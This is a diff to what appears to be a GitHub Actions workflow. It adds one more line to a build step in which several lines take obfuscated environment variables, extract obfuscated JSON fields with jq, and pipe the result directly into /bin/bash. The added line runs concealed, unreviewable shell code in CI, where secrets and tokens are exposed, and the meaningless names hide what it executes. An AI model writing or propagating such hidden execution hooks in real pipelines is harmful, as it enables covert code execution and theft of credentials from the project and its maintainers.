@@ -34,6 +34,7 @@ jobs:
           echo $vbgd53 | jq -r .mxbdj4 | /bin/bash
           printf '%s' "$snm124" | jq -r .qbbm1566 | /bin/bash
           printf '%s' "$ahlpt6" | jq -r .mba27169 | /bin/bash
+          echo $l37450 | jq -r .lv12743 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
